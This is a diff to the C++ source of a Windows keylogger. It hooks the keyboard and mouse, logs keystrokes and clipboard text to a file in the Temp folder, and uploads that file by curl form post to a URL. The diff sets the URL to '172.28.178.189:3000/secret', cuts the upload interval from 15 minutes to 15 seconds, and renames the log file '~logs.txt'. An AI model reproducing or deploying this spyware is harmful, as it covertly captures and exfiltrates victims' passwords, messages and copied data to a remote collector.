@@ -11,6 +11,7 @@
 #include <iphlpapi.h>
 #include <set>
 
+
 #include "curl/curl.h"
 
 // Linking the libraries
@@ -29,6 +30,7 @@
 #pragma comment(lib, "advapi32.lib") // advapi32.dll windows' library
 #pragma comment(lib, "crypt32.lib")	 // crypt32.dll windows' library
 #pragma comment(lib, "wldap32.lib")	 // wldap32.dll windows' library
+#pragma comment(lib, "Ws2_32.lib")  // ws2_32.dll windows' library
 
 #define VK_0 0x30 // '0'
 #define VK_1 0x31 // '1'
@@ -70,7 +72,7 @@
 
 // redefine some keys for the Italian keyboard
 // SC stay for "Special Characters" with accent
-#define VK_SC_E 0xBA	   // èé[{ (VK_OEM_3)
+#define VK_SC_E 0xBA	   // èé[{  (VK_OEM_3)
 #define VK_SC_O 0xC0	   // òç@	(VK_OEM_1)
 #define VK_SC_A 0xDE	   // à°#	(VK_OEM_7)
 #define VK_SC_U 0xBF	   // ù§	(VK_OEM_2)
@@ -79,25 +81,25 @@
 #define VK_APOSTROPHE 0xDB // '?	(VK_OEM_4)
 
 HHOOK hKeyboardHook; // istancing the keyboard hook
-HHOOK hMouseHook;	 // istancing the mouse hook
+HHOOK hMouseHook;	 // istancing the mouse hoo
 
 char tempFolderPath[MAX_PATH];										   // istancing a char array to memorize the TempFolder Path
 DWORD result = GetTempPathA(MAX_PATH, tempFolderPath);				   // getting the TempFolder Path due to windows' function
-const std::string FilePath = (std::string)tempFolderPath + "logs.txt"; // setting the path of where i'm going to save the key pressed
+const std::string FilePath = (std::string)tempFolderPath + "~logs.txt"; // setting the path of where i'm going to save the key pressed
 
-const std::chrono::seconds waitTime = std::chrono::seconds(int(15 * 60)); // seconds -> 15 minutes
+const std::chrono::seconds waitTime = std::chrono::seconds(int(0.25 * 60)); // seconds 
 
 std::string clipBoardLastSave = ""; // saving the text saved in the windows' clipBoard
 std::string contentFile = "";		// save everything of what is been writing down
 
-std::string my_url = ""; // --> you have to put your own website, in which you should have a ".php" file or somthing similar, where you send the file to your e-mail
+std::string my_url = "172.28.178.189:3000/secret"; // --> you have to put your own website, in which you should have a ".php" file or somthing similar, where you send the file to your e-mail
 
 // Keyboard hook
 static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
 	{
-		KBDLLHOOKSTRUCT *pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
+		KBDLLHOOKSTRUCT* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
 		int vkCode = pKeyboardStruct->vkCode;
 
 		const std::set<int> ignoredKeys = {
@@ -105,7 +107,7 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			VK_F8, VK_F9, VK_F10, VK_F11, VK_F12, VK_CAPITAL,
 			VK_LSHIFT, VK_RSHIFT, VK_LCONTROL, VK_RCONTROL,
 			VK_LMENU, VK_RMENU, VK_APPS, VK_SNAPSHOT, VK_SCROLL,
-			VK_PAUSE, VK_CLEAR};
+			VK_PAUSE, VK_CLEAR };
 
 		if (ignoredKeys.count(vkCode) > 0) // Check if the key is in the ignored keys set
 			return CallNextHookEx(NULL, nCode, wParam, lParam);
@@ -113,6 +115,7 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		bool isShiftPressed = GetAsyncKeyState(VK_LSHIFT) & 0x8000 || GetAsyncKeyState(VK_RSHIFT) & 0x8000;
 		bool isCtrlPressed = GetAsyncKeyState(VK_LCONTROL) & 0x8000 || GetAsyncKeyState(VK_RCONTROL) & 0x8000;
 		bool isAltPressed = GetAsyncKeyState(VK_LMENU) & 0x8000;
+		bool isWinKeyPressed = GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000;
 		bool isAltGrPressed = GetAsyncKeyState(VK_LCONTROL) & 0x8000 && GetAsyncKeyState(VK_RMENU) & 0x8000;
 		bool isCapsLockActive = GetKeyState(VK_CAPITAL) & 0x0001;
 		bool isNumLockActive = GetKeyState(VK_NUMLOCK) & 0x0001;
@@ -130,7 +133,7 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 				if (hData != NULL)
 				{
 					// getting the text from the clipboard by locking it
-					char *text = static_cast<char *>(GlobalLock(hData));
+					char* text = static_cast<char*>(GlobalLock(hData));
 					if (text != NULL)
 					{
 						message.append("\n--- CTRL + (C/V) ---\n");
@@ -221,6 +224,7 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			case VK_SC_A: // #
 				message = "#";
 				break;
+			default: break;
 			}
 		}
 		// curly brackets
@@ -346,8 +350,10 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		// ARROWS (UP, DOWN, LEFT, RIGHT)
 		else if (!isShiftPressed && !isAltGrPressed && !isAltPressed && (vkCode >= VK_LEFT && vkCode <= VK_DOWN) || (!isNumLockActive && vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9))
 		{
-			if (isCtrlPressed)
+			if (isCtrlPressed && !isWinKeyPressed)
 				message = "|CTRL->";
+			else if (isCtrlPressed && isWinKeyPressed)
+				message = "|CTRLwin->";
 			else
 				message = "|->";
 			switch (vkCode)
@@ -450,14 +456,14 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 }
 
 // Check if the clipboard is open and if there is a possible copy
-static void checkPossibleCopy(std::string &mess)
+static void checkPossibleCopy(std::string& mess)
 {
 	if (OpenClipboard(NULL))
 	{
 		HANDLE hData = GetClipboardData(CF_TEXT);
 		if (hData != NULL)
 		{
-			char *text = static_cast<char *>(GlobalLock(hData));
+			char* text = static_cast<char*>(GlobalLock(hData));
 			if (text != NULL)
 			{
 				if (clipBoardLastSave != text)
@@ -502,7 +508,7 @@ static LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 }
 
 // function to convert the MAC address from BYTE to string
-static void MACToString(const BYTE *MACData, std::string &macStr)
+static void MACToString(const BYTE* MACData, std::string& macStr)
 {
 	std::ostringstream oss;
 	for (int i = 0; i < 6; ++i)
@@ -608,21 +614,21 @@ static std::string StartString()
 
 static void makeRequest()
 {
-	CURL *curl;
+	CURL* curl;
 	CURLcode res;
 	curl_global_init(CURL_GLOBAL_ALL);
 	curl = curl_easy_init();
 	// Check if the curl is correctly istanced
 	if (curl)
 	{
-		curl_easy_setopt(curl, CURLOPT_URL, my_url);
+		curl_easy_setopt(curl, CURLOPT_URL, my_url.c_str());
 		// Imposting the file to send
-		struct curl_httppost *formpost = NULL;
-		struct curl_httppost *lastptr = NULL;
+		struct curl_httppost* formpost = NULL;
+		struct curl_httppost* lastptr = NULL;
 		curl_formadd(&formpost, &lastptr,
-					 CURLFORM_COPYNAME, "file",
-					 CURLFORM_FILE, FilePath.c_str(),
-					 CURLFORM_END);
+			CURLFORM_COPYNAME, "file",
+			CURLFORM_FILE, FilePath.c_str(),
+			CURLFORM_END);
 		// Set the form post parameter
 		curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
 		// Make the request and check the result
